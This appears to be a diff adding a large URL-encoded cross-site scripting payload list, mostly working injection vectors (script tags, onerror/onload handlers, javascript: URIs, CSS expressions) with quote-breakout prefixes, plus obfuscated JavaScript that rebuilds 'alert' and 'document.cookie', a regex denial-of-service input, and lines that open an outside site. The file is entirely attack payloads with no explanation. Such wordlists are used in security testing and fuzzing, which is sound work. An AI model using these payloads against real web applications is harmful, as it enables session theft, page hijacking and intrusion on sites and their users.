+'%3E%3Cp%20style=%22filter:%20'expression(alert(1))'%22%3E  
+%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+%22%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+'%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+%3Cp%20style=%22font-family:%20'foo&amp;x5c;27&amp;  
+%22%3E%3Cp%20style=%22font-family:%20'foo&amp;x5c;27&amp;  
+'%3E%3Cp%20style=%22font-family:%20'foo&amp;x5c;27&amp;  
+%3Ciframe/src=%22data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==%22%3E  
+%22%3E%3Ciframe/src=%22data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==%22%3E  
+'%3E%3Ciframe/src=%22data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==%22%3E  
+%3Csvg%3E%3Cscript%20xlink:href=data&colon;,window.open('http://www.opensecurity.in')%3E%3C/script  
+%22%3E%3Csvg%3E%3Cscript%20xlink:href=data&colon;,window.open('http://www.opensecurity.in')%3E%3C/script  
+'%3E%3Csvg%3E%3Cscript%20xlink:href=data&colon;,window.open('http://www.opensecurity.in')%3E%3C/script  
+http://www.opensecurity%3Cscript%20.in%3Ealert(document.location)%3C/script  
+&  
+%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+%22%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+'%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+perl%20-e%20'print%20%22&lt;IMG%20SRC=java/0script:alert(/%22X/%22)&gt;%22;'%20&gt;%20out  
+perl%20-e%20'print%20%22&lt;SCR/0IPT&gt;alert(/%22X/%22)&lt;/SCR/0IPT&gt;%22;'%20&gt;%20out  
+perl%20-e%20'print%20%22%3CIMG%20SRC=java/0script:alert(1)%3E%22;'%3E%20out  
+window[%22ale%22+(!![]+[])[-~[]]+(!![]+[])[+[]]]()  
+window[%22ale%22+%22/x72/x74%22]()  
+window[%22/x61/x6c/x65/x72/x74%22]()  
+window['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()  
+window['ale'+'/x72/x74']()  
+window['/x61/x6c/x65/x72/x74']()  
+window[(+%7B%7D+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))  
+window[(+%7B%7D+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]  
+this[%22ale%22+(!![]+[])[-~[]]+(!![]+[])[+[]]]()  
+this[%22ale%22+%22/x72/x74%22]()  
+this[%22/x61/x6c/x65/x72/x74%22]()  
+this['ale'+'/x72/x74']()  
+this['/x61/x6c/x65/x72/x74']()  
+this[(+%7B%7D+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))  
+this[(+%7B%7D+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]  
+this[%22document%22][%22cookie%22]  
+this[%22document%22][%22/x63/x6f/x6f/x6b/x69/x65%22]  
+this[%22/x64/x6f/x63/x75/x6d/x65/x6e/x74%22][%22cookie%22]  
+this[%22/x64/x6f/x63/x75/x6d/x65/x6e/x74%22][%22/x63/x6f/x6f/x6b/x69/x65%22]  
+this[%22document%22][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+%22kie%22]  
+this[%22document%22][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+%22/x6b/x69/x65%22]  
+this[%22docum%22+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+%22/x6b/x69/x65%22]  
+this[%22docum%22+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+%22kie%22]  
+this[%22docum%22+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][%22/x63/x6f/x6f/x6b/x69/x65%22]  
+this[%22docum%22+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][%22cookie%22]  
+this[%22/x64/x6f/x63/x75/x6d%22+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+%22/x6b/x69/x65%22]  
+this[%22/x64/x6f/x63/x75/x6d%22+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+%22kie%22]  
+this[%22/x64/x6f/x63/x75/x6d%22+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][%22/x63/x6f/x6f/x6b/x69/x65%22]  
+this[%22/x64/x6f/x63/x75/x6d%22+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][%22cookie%22]  
+this['document']['cookie']  
+this['document']['/x63/x6f/x6f/x6b/x69/x65']  
+this['/x64/x6f/x63/x75/x6d/x65/x6e/x74']['cookie']  
+this['/x64/x6f/x63/x75/x6d/x65/x6e/x74']['/x63/x6f/x6f/x6b/x69/x65']  
+this['document'][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+'kie']  
+this['document'][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+'/x6b/x69/x65']  
+this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+'/x6b/x69/x65']  
+this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+'kie']  
+this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['/x63/x6f/x6f/x6b/x69/x65']  
+this['/x64/x6f/x63/x75/x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+'kie']  
+this['/x64/x6f/x63/x75/x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['/x63/x6f/x6f/x6b/x69/x65']  
+this['/x64/x6f/x63/x75/x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['cookie']  
+document[%22cookie%22]  
+document[%22/x63/x6f/x6f/x6b/x69/x65%22]  
+document[(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+%22kie%22]  
+document[(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+%22/x6b/x69/x65%22]  
+document['cookie']  
+document['/x63/x6f/x6f/x6b/x69/x65']  
+document[(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+'kie']  
+document[(%7B%7D+[])[!+[]+!![]+!![]+!![]+!![]]+(%7B%7D+[])[+!![]]+(%7B%7D+[])[+!![]]+'/x6b/x69/x65']  
+%3Cscript%3Edocument.body.innerHTML=%22%3Ca%20onmouseover%0B=location=%27/x6A/x61/x76/x61/x53/x43/x52/x49/x50/x54/x26/x63/x6F/x6C/x6F/x6E/x3B/x63/x6F/x6E/x66/x69/x72/x6D/x26/x6C/x70/x61/x72/x3B/x64/x6F/x63/x75/x6D/x65/x6E/x74/x2E/x63/x6F/x6F/x6B/x69/x65/x26/x72/x70/x61/x72/x3B%27%3E%3Cinput%20name=attributes%3E%22;%3C/script%3E  
+%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=5%22%3E%3Cp%20style=%22font-family:',;a//22//3e//3cimg//20src//3dx//20onerror//3d//61lert//28//31//29//3e:1'%22%3Eoh-oh%3C/p%3E  
+%22%3E%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=5%22%3E%3Cp%20style=%22font-family:',;a//22//3e//3cimg//20src//3dx//20onerror//3d//61lert//28//31//29//3e:1'%22%3Eoh-oh%3C/p%3E  
+'%3E%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=5%22%3E%3Cp%20style=%22font-family:',;a//22//3e//3cimg//20src//3dx//20onerror//3d//61lert//28//31//29//3e:1'%22%3Eoh-oh%3C/p%3E  
+%3Ciframe/onload=action=/confir/.source+'m';eval(action)(1)%3E  
+%22%3E%3Ciframe/onload=action=/confir/.source+'m';eval(action)(1)%3E  
+'%3E%3Ciframe/onload=action=/confir/.source+'m';eval(action)(1)%3E  
+%3C!--[if%20WindowsEdition]%3E%3Cscript%3Econfirm(1);%3C/script%3E%3C![endif]--%3E  
+%22%3E%3C!--[if%20WindowsEdition]%3E%3Cscript%3Econfirm(1);%3C/script%3E%3C![endif]--%3E  
+'%3E%3C!--[if%20WindowsEdition]%3E%3Cscript%3Econfirm(1);%3C/script%3E%3C![endif]--%3E  
+%3Cimg%20src=x%20onerror=confirm(/X/)%3E  
+%22%3E%3Cimg%20src=x%20onerror=confirm(/X/)%3E  
+'%3E%3Cimg%20src=x%20onerror=confirm(/X/)%3E  
+%3Cform/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)%3E%20%3Cbutton/type=submit%3E  
+%22%3E%3Cform/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)%3E%20%3Cbutton/type=submit%3E  
+'%3E%3Cform/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)%3E%20%3Cbutton/type=submit%3E  
+%3Cstyle/onload%20%20%20%20=%20%20%20%20!-alert&  
+%22%3E%3Cstyle/onload%20%20%20%20=%20%20%20%20!-alert&  
+'%3E%3Cstyle/onload%20%20%20%20=%20%20%20%20!-alert&  
+%3Ciframe/name=%22if(0)%7B/u0061lert(1)%7Delse%7B/u0061lert(1)%7D%22/onload=%22eval(name)%22;%3E  
+%22%3E%3Ciframe/name=%22if(0)%7B/u0061lert(1)%7Delse%7B/u0061lert(1)%7D%22/onload=%22eval(name)%22;%3E  
+'%3E%3Ciframe/name=%22if(0)%7B/u0061lert(1)%7Delse%7B/u0061lert(1)%7D%22/onload=%22eval(name)%22;%3E  
+%3Csvg%3E%3C%E2%80%AEGMO=%60%3Cftw=%60skrowtillehehtwoh;%20onload=confirm(location);  
+%22%3E%3Csvg%3E%3C%E2%80%AEGMO=%60%3Cftw=%60skrowtillehehtwoh;%20onload=confirm(location);  
+'%3E%3Csvg%3E%3C%E2%80%AEGMO=%60%3Cftw=%60skrowtillehehtwoh;%20onload=confirm(location);  
+%22%3E%3Cimg%20src=x%20onerror=confirm(1);%3E  
+%3Cimg/src=x%20alt=confirm(1)%20onerror=eval(alt)%3E  
+%22%3E%3Cimg/src=x%20alt=confirm(1)%20onerror=eval(alt)%3E  
+'%3E%3Cimg/src=x%20alt=confirm(1)%20onerror=eval(alt)%3E  
+%3Cimg%20src=x%20onerror=alert(1)//%3E  
+%22%3E%3Cimg%20src=x%20onerror=alert(1)//%3E  
+'%3E%3Cimg%20src=x%20onerror=alert(1)//%3E  
+%3Csvg%3E%3Cg/onload=alert(1)//  
+%22%3E%3Csvg%3E%3Cg/onload=alert(1)//  
+'%3E%3Csvg%3E%3Cg/onload=alert(1)//  
+%3Ciframe///src=jAva&Tab;script:alert(1)%3E  
+%22%3E%3Ciframe///src=jAva&Tab;script:alert(1)%3E  
+'%3E%3Ciframe///src=jAva&Tab;script:alert(1)%3E  
+%3Cmath%3E%3Cmi//xlink:href=%22data:x,%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E  
+onClick=%22alert('Hello%20/u0022%3E')%22  
+onload=alert(1)  
+%22%20onload=alert(1)%20%22  
+%22%20onload=alert(1)  
+%20onload=alert(1)%20%22  
+%22%20onload=alert(1)%20id=%22a  
+onload%20=alert(1)%20id=%22a  
+%3Ca%20href='  
+%22%3E%3Ca%20href='  
+'%3E%3Ca%20href='  
+javascript:alert(1)'%3Ea%3C/a%3E  
+%3Clisting%3E&lt;img%20onerror=%22alert(1);//%22%20src=1&gt;%3Ct%20t%3E%3C/listing%3E  
+%22%3E%3Clisting%3E&lt;img%20onerror=%22alert(1);//%22%20src=1&gt;%3Ct%20t%3E%3C/listing%3E  
+'%3E%3Clisting%3E&lt;img%20onerror=%22alert(1);//%22%20src=1&gt;%3Ct%20t%3E%3C/listing%3E  
+%3Cimg%20src=x%20id/='%20onerror=alert(1)//'%3E  
+%22%3E%3Cimg%20src=x%20id/='%20onerror=alert(1)//'%3E  
+'%3E%3Cimg%20src=x%20id/='%20onerror=alert(1)//'%3E  
+%3Ctextarea%3EX%3C/textarea%3E%3C!--%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(1)%3E--%3E  
+%22%3E%3Ctextarea%3EX%3C/textarea%3E%3C!--%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(1)%3E--%3E  
+'%3E%3Ctextarea%3EX%3C/textarea%3E%3C!--%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(1)%3E--%3E  
+%3Cb%3E%3Cnoscript%3E%3C!--%20%3C/noscript%3E%3Cimg%20src=xx:%20onerror=alert(1)%20--%3E%3C/noscript%3E  
+%22%3E%3Cb%3E%3Cnoscript%3E%3C!--%20%3C/noscript%3E%3Cimg%20src=xx:%20onerror=alert(1)%20--%3E%3C/noscript%3E  
+'%3E%3Cb%3E%3Cnoscript%3E%3C!--%20%3C/noscript%3E%3Cimg%20src=xx:%20onerror=alert(1)%20--%3E%3C/noscript%3E  
+%3Cb%3E%3Cnoscript%3E%3Ca%20alt=%22%3C/noscript%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E%22%3E%3C/noscript%3E  
+%22%3E%3Cb%3E%3Cnoscript%3E%3Ca%20alt=%22%3C/noscript%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E%22%3E%3C/noscript%3E  
+'%3E%3Cb%3E%3Cnoscript%3E%3Ca%20alt=%22%3C/noscript%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E%22%3E%3C/noscript%3E  
+%3Cbody%3E%3Ctemplate%3E%3Cs%3E%3Ctemplate%3E%3Cs%3E%3Cimg%20src=x%20onerror=alert(1)%3EX%3C/s%3E%3C/template%3E%3C/s%3E%3C/template%3E  
+%22%3E%3Cbody%3E%3Ctemplate%3E%3Cs%3E%3Ctemplate%3E%3Cs%3E%3Cimg%20src=x%20onerror=alert(1)%3EX%3C/s%3E%3C/template%3E%3C/s%3E%3C/template%3E  
+'%3E%3Cbody%3E%3Ctemplate%3E%3Cs%3E%3Ctemplate%3E%3Cs%3E%3Cimg%20src=x%20onerror=alert(1)%3EX%3C/s%3E%3C/template%3E%3C/s%3E%3C/template%3E  
+%3Ca%20href=%22%01java%03script:alert(1)%22%3EX%3Ca%3E  
+%22%3E%3Ca%20href=%22%01java%03script:alert(1)%22%3EX%3Ca%3E  
+'%3E%3Ca%20href=%22%01java%03script:alert(1)%22%3EX%3Ca%3E  
+%01%3Coption%3E%3Cstyle%3E%3C/option%3E%3C/select%3E%3Cb%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E%3C/style%3E%3C/option%3E  
+%3Coption%3E%3Ciframe%3E%3C/select%3E%3Cb%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/iframe%3E%3C/option%3E  
+%3Cb%3E%3Cstyle%3E%3Cstyle/%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E  
+%22%3E%3Cb%3E%3Cstyle%3E%3Cstyle/%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E  
+'%3E%3Cb%3E%3Cstyle%3E%3Cstyle/%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E  
+%3Cb%3E%3Cstyle%3E%3Cstyle////%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E%3C/style%3E  
+%22%3E%3Cb%3E%3Cstyle%3E%3Cstyle////%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E%3C/style%3E  
+'%3E%3Cb%3E%3Cstyle%3E%3Cstyle////%3E%3Cimg%20src=xx:%20onerror=alert(1)%3E%3C/style%3E  
+%3Cimage%20name=body%3E%3Cimage%20name=adoptNode%3EX%3Cimage%20name=firstElementChild%3E%3Csvg%20onload=alert(1)%3E  
+%22%3E%3Cimage%20name=body%3E%3Cimage%20name=adoptNode%3EX%3Cimage%20name=firstElementChild%3E%3Csvg%20onload=alert(1)%3E  
+'%3E%3Cimage%20name=body%3E%3Cimage%20name=adoptNode%3EX%3Cimage%20name=firstElementChild%3E%3Csvg%20onload=alert(1)%3E  
+%3Cimage%20name=activeElement%3E%3Csvg%20onload=alert(1)%3E  
+%22%3E%3Cimage%20name=activeElement%3E%3Csvg%20onload=alert(1)%3E  
+'%3E%3Cimage%20name=activeElement%3E%3Csvg%20onload=alert(1)%3E  
+%3Cimage%20name=body%3E%3Cimg%20src=x%3E%3Csvg%20onload=alert(1);%20autofocus%3E,%20%3Ckeygen%20onfocus=alert(1);%20autofocus%3E  
+%22%3E%3Cimage%20name=body%3E%3Cimg%20src=x%3E%3Csvg%20onload=alert(1);%20autofocus%3E,%20%3Ckeygen%20onfocus=alert(1);%20autofocus%3E  
+'%3E%3Cimage%20name=body%3E%3Cimg%20src=x%3E%3Csvg%20onload=alert(1);%20autofocus%3E,%20%3Ckeygen%20onfocus=alert(1);%20autofocus%3E  
+%3Cdiv%20onmouseout=%22javascript:alert(/X/)%22%20x=yscript:%20n%3EX  
+%22%3E%3Cdiv%20onmouseout=%22javascript:alert(/X/)%22%20x=yscript:%20n%3EX  
+'%3E%3Cdiv%20onmouseout=%22javascript:alert(/X/)%22%20x=yscript:%20n%3EX  
+%3Cdiv%20wow=removeme%20onmouseover=alert(1)%3Etext  
+%22%3E%3Cdiv%20wow=removeme%20onmouseover=alert(1)%3Etext  
+'%3E%3Cdiv%20wow=removeme%20onmouseover=alert(1)%3Etext  
+%3Cinput%20x=javascript:%20autofocus%20onfocus=alert(1)%3E%3Csvg%20id=1%20onload=alert(1)%3E%3C/svg%3E  
+%22%3E%3Cinput%20x=javascript:%20autofocus%20onfocus=alert(1)%3E%3Csvg%20id=1%20onload=alert(1)%3E%3C/svg%3E  
+'%3E%3Cinput%20x=javascript:%20autofocus%20onfocus=alert(1)%3E%3Csvg%20id=1%20onload=alert(1)%3E%3C/svg%3E  
+%3Cform%20action=%22javascript:alert(1)%22%3E%3Cbutton%3EX%3C/button%3E%3C/form%3E  
+%22%3E%3Cform%20action=%22javascript:alert(1)%22%3E%3Cbutton%3EX%3C/button%3E%3C/form%3E  
+'%3E%3Cform%20action=%22javascript:alert(1)%22%3E%3Cbutton%3EX%3C/button%3E%3C/form%3E  
+0?%3Cscript%3EWorker(%22  
+%3Cinput%20onfocus=alert(1)%20autofocus%3E  
+%22%3E%3Cinput%20onfocus=alert(1)%20autofocus%3E  
+'%3E%3Cinput%20onfocus=alert(1)%20autofocus%3E  
+%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3C/svg  
+%22%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3C/svg  
+'%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3C/svg%3E  
+%22%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3C/svg%3E  
+'%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3C/svg%3E  
+%3Cx%20repeat=%22template%22%20repeat-start=%22999999%22%3E0%3Cy%20repeat=%22template%22%20repeat-start=%22999999%22%3E1%3C/y%3E%3C/x%3E  
+%22%3E%3Cx%20repeat=%22template%22%20repeat-start=%22999999%22%3E0%3Cy%20repeat=%22template%22%20repeat-start=%22999999%22%3E1%3C/y%3E%3C/x%3E  
+'%3E%3Cx%20repeat=%22template%22%20repeat-start=%22999999%22%3E0%3Cy%20repeat=%22template%22%20repeat-start=%22999999%22%3E1%3C/y%3E%3C/x%3E  
+%3Cinput%20pattern=%5E((a+.)a)+$%20value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!%3E  
+%22%3E%3Cinput%20pattern=%5E((a+.)a)+$%20value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!%3E  
+'%3E%3Cinput%20pattern=%5E((a+.)a)+$%20value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!%3E  
+%3Cscript%3E(%7B0:  
+%22%3E%3Cscript%3E(%7B0:  
+'%3E%3Cscript%3E(%7B0:  
+X%3Cx%20style=%60behavior:url(  
+%3Cmeta%20charset=%22x-mac-farsi%22%3E%C2%BCscript%20%C2%BEalert(1)//%C2%BC/script%20%C2%BE  
+%22%3E%3Cmeta%20charset=%22x-mac-farsi%22%3E%C2%BCscript%20%C2%BEalert(1)//%C2%BC/script%20%C2%BE  
+'%3E%3Cmeta%20charset=%22x-mac-farsi%22%3E%C2%BCscript%20%C2%BEalert(1)//%C2%BC/script%20%C2%BE  
+%3Cinput%20onblur=focus()%20autofocus%3E%3Cinput%3E  
+%22%3E%3Cinput%20onblur=focus()%20autofocus%3E%3Cinput%3E  
+'%3E%3Cinput%20onblur=focus()%20autofocus%3E%3Cinput%3E  
+%3Cform%20id=test%20onforminput=alert(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=alert(1)%3EX%3C/button%3E  
+%22%3E%3Cform%20id=test%20onforminput=alert(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=alert(1)%3EX%3C/button%3E  
+'%3E%3Cform%20id=test%20onforminput=alert(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=alert(1)%3EX%3C/button%3E  
+1%3Cset/xmlns=%60urn:schemas-microsoft-com:time%60%20style=%60behAvior:url(  
+1%3Canimate/xmlns=urn:schemas-microsoft-com:time%20style=behavior:url(  
+%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(alert(1))%7d  
+%22%3E%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(alert(1))%7d  
+'%3E%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(alert(1))%7d  
+%3Cstyle%3E@import%20%22data:,*%7bx:expression(alert(1))%7D%22;%3C/style%3E  
+%22%3E%3Cstyle%3E@import%20%22data:,*%7bx:expression(alert(1))%7D%22;%3C/style%3E  
+'%3E%3Cstyle%3E@import%20%22data:,*%7bx:expression(alert(1))%7D%22;%3C/style%3E  
+%3Ctable%20background=%22javascript:alert(32)%22%3E%3C/table%3E  
+%22%3E%3Ctable%20background=%22javascript:alert(32)%22%3E%3C/table%3E  
+'%3E%3Ctable%20background=%22javascript:alert(32)%22%3E%3C/table%3E  
+%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22alert(1);%22%3EXXX%3C/a%3E%3C/a%3E%3Ca%20href=%22javascript:alert(1)%22%3EXXX%3C/a%3E  
+%22%3E%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22alert(1);%22%3EXXX%3C/a%3E%3C/a%3E%3Ca%20href=%22javascript:alert(1)%22%3EXXX%3C/a%3E  
+'%3E%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22alert(1);%22%3EXXX%3C/a%3E%3C/a%3E%3Ca%20href=%22javascript:alert(1)%22%3EXXX%3C/a%3E  
+%3C![%3E%3Cimg%20src=%22]%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%22%3E%3C![%3E%3Cimg%20src=%22]%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+'%3E%3C![%3E%3Cimg%20src=%22]%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%3Csvg%3E%3C![CDATA[%3E%3Cimage%20xlink:href=%22]]%3E%3Cimg%20src=xx:x%20onerror=alert(1)//%22%3E%3C/svg%3E  
+%22%3E%3Csvg%3E%3C![CDATA[%3E%3Cimage%20xlink:href=%22]]%3E%3Cimg%20src=xx:x%20onerror=alert(1)//%22%3E%3C/svg%3E  
+'%3E%3Csvg%3E%3C![CDATA[%3E%3Cimage%20xlink:href=%22]]%3E%3Cimg%20src=xx:x%20onerror=alert(1)//%22%3E%3C/svg%3E  
+%3C%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%22%3E%3C%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+'%3E%3C%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%22%3E%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+'%3E%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%3C%3Cli%20style=list-style:url()%20onerror=alert(1)%3E%3C/li%3E  
+%22%3E%3C%3Cli%20style=list-style:url()%20onerror=alert(1)%3E%3C/li%3E  
+'%3E%3C%3Cli%20style=list-style:url()%20onerror=alert(1)%3E%3C/li%3E  
+%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+%22%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+'%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+%3Cvideo%20onerror=%22alert(1)%22%3E%3Csource%3E%3C/source%3E%3C/video%3E%3C/div%3E  
+%22%3E%3Cvideo%20onerror=%22alert(1)%22%3E%3Csource%3E%3C/source%3E%3C/video%3E%3C/div%3E  
+'%3E%3Cvideo%20onerror=%22alert(1)%22%3E%3Csource%3E%3C/source%3E%3C/video%3E%3C/div%3E  
+%3Cb%20%3Cscript%3Ealert(1)//%3C/script%3E0%3C/script%3E%3C/b%3E  
+%22%3E%3Cb%20%3Cscript%3Ealert(1)//%3C/script%3E0%3C/script%3E%3C/b%3E  
+'%3E%3Cb%20%3Cscript%3Ealert(1)//%3C/script%3E0%3C/script%3E%3C/b%3E%3C/div%3E  
+%22%3E%3Cb%20%3Cscript%3Ealert(1)//%3C/script%3E0%3C/script%3E%3C/b%3E%3C/div%3E  
+'%3E%3Cb%20%3Cscript%3Ealert(1)//%3C/script%3E0%3C/script%3E%3C/b%3E%3C/div%3E  
+%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert(1)%3C/script%20%3C/b%3E%3C/b%3E  
+%22%3E%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert(1)%3C/script%20%3C/b%3E%3C/b%3E  
+'%3E%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert(1)%3C/script%20%3C/b%3E%3C/b%3E%3C/div%3E  
+%22%3E%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert(1)%3C/script%20%3C/b%3E%3C/b%3E%3C/div%3E  
+'%3E%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert(1)%3C/script%20%3C/b%3E%3C/b%3E%3C/div%3E  
